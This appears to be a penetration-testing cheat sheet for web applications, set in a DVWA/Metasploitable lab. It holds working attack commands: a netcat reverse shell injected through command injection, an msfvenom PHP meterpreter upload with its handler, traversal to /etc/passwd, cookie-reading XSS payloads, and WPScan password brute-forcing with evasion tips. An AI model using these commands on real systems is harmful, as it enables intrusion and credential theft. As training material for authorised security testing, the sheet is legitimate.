#### Hacking Web Applications
```bash
Web Application is a user interface b/w client and server to communicate.
It’s a SW program, which will run on the web server and accessed by clients using browsers over http / https protocols.
Web pages are generated at the server and the browsers present them at the client side.
Allows client to interact with the application for services.
Web application attacks are caused by client and server side vulnerabilities.
Web Server: Responsible for static web pages.
Application server: Responsible for Dynamic pages.
Data is kept in Database.
```
### Vulnerabilities
#### Insecure direct object reference (IDOR)
```bash
A URL like example.com/transaction?id=123 shows your transaction. Changing it to id=124 reveals someone else’s data — this is an IDOR vulnerability.
```
#### Server side request Forgery
```bash
Server-Side Request Forgery (SSRF) is a web security vulnerability that allows an attacker to manipulate a server to make requests to unintended destinations.
in short, it involves tracking a server into making request to internal resources, potentially, exposing sensitive data or system that shouldn’t be reachable.
```
#### CSRF
```bash
CSRF, or Cross-Site Request Forgery, is a type of security vulnerability where an attacker tricks a user's browser into making unwanted actions on a web application where they're authenticated.
```
#### Cryptographic Failures
```bash
Vulnerability is include Not encrypting for using weak keys/encryption mechanisms, and improperly validated certificate elements.
```
#### File Traversal (Directory Traversal)
```bash
Attacker tries to access restricted folders or files on the server

you can try:
dirb -u <Target>
https://example.com/view?file=images/cat.jpg

If the server is not validating the file path properly, an attacker could do:
https://example.com/view?file=../../../../etc/passwd
```
#### Cross Site Scripting (XXS) - ( HTML / JS)
```bash
Attackers inject HTML/JS payloads into input field or URL if there is vulnerability and no validation, can be  used to extract cookies and other information.
1 Reflected XSS ;
Temporary method of creating a legitimate link along with malicious payload and send it to victim.
This is temporary and specific to a victim

<script>alert(document.cookie)</script>

2 Stored XSS
It is also permanent, here attacker is not going to share any link to the victim, instead attacker compromise the webserver and inside the server attacker is going to add/deploy the malicious script.
When a user visit a site, the script will be executed and the data will be shared with the attacker.
<script>alert(document.cookie)</script>

```

#### Command Injection
```bash
Criminal is going to try to add basic Linux OS commands into user input field is the destination is vulnerable. This may lead attacker injecting malicious commands to get sensitive information from the web server.

Commands

Open New terminal => sudo su
nc -nlvp 9696

Go back to cmd exec., 
8.8.8.8 | nc -e /bin/bash 192.168.1.9 9696

come back to NC terminal
pwd
ls
uname -a
python -c 'import pty; pty.spawn("/bin/bash")'
ls
exit

Command Execution:
If Linux
| ls "<Path>"
#once files are listed
| cat "<Path>"

If Windows
| dir "<Path>"
#once files are listed
| type "<Path>"

```

#### File Upload
```bash
Web server allows attackers to upload files to its filesystem without proper validation like name, type, contents or size. Due to this improper validation type of files getting uploaded, an attacker will be able to upload malicious files.

**Commands**
DVWA cred's =>
username - admin
passwd - password

In parrot browser > http://192.168.1.7/dvwa 
[Note :- make sure to set DVWA script security to LOW]

New terminal
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=9999 --platform php -o Desktop/upload.php

New terminal
msfconsole
use multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.1.9
set LPORT 9999
exploit -j

upload the "upload.php" file in dvwa upload vuln., once file is uploaded copy the full path and in URL remove # & paste the path & hit enter
#If the process is unclear, check the below PoC
come back to msfconsole & hit enter once
sessions
sessions -i 1
	> sysinfo

[Note :- 192.168.1.7 is Meta 2 ip] [Note :- 192.168.1.9 is parrot ip]
```
#### Burpsuire
```bash
In the Browser to send the data through the Burp-suite(when intercept is on)  we have to Set the Connection Settings of the browser to Manual Proxy Configuration and HTTP Proxy = 127.0.0.1  Port = 8080 and the other(HTTP proxy and Socks Host) make them empty and click ok.

make sure intercept is on, to intercept traffice
```
#### ZAP
```bash
To open ZAP from terminal use zaproxy and hit enter.
Choose the Automated scan, enter the URL
Then Start Attack
Here Spider will crawl to directories, but sometimes it may miss some endpoints
The final results will be in Alerts
```

#### Automated Tool - Smart Scanner
```bash
 cd wapiti
 python3 -m venv wapiti3 #to create a virtual env.
 . wapiti3/bin/activate #activate virtual env.
 pip install . #to intstall wapiti web application scanner
 wapiti -u https://[targetSite]
 
 #Note: It would take 10min to complete the scan. And the final report 
 /root/.wapiti/generated_report/
 
```

#### Dirb
```bash
Dirb is a web content scanner used in penetration testing to find hidden directories and files on a web server by brute-forcing URLs using a wordlist.

new terminal
sudo su
man dirb

dirb http://<Meta2IP>

Specific search
dirb <URL> -X .txt

Alternatives: 
Gobuster 
nikto
```
#### TO FIND THE FIREWALL USED BY TARGE
```bash
wafw00f <url>

We can use this also "http-waf-detect.nse "

```

#### WPSCAN — Wordpress sites
```bash
sudo apt install wpscan
wpscan --update -> to update the vulnerability database:
wpscan --url http://targetsite.com → To detect whether it’s a WordPress site and check for potential vulnerabilities.
User Enumeration : wpscan --url https://example/ --enumerate u
Bruteforce: wpscan --url https://example/ --passwords wordlist.txt --usernames samson

brute force attack on wordpress login:
wpscan --url http://targetsite.com --passwords /path/to/wordlist.txt --usernames admin

Important Options :
`-e u   (enumerates usernames)`
`-e p   (enumerates plugins)`
`-e t   (enumerates themes)`
`-e ap  (enumerates all plugins)`
`-e at  (enumerates all themes)`
`-e dbe (enumerates database exports)`
`-e vp  (enumerates only vulnerable plugins)`
`-e vt  (enumerates only vulnerable themes)`
`-e cb  (enumerates config backups)`
`-e x   (enumerates all)`

Tips:
always update the database before scanning
use --random-user-agent to avoid being blocked

```

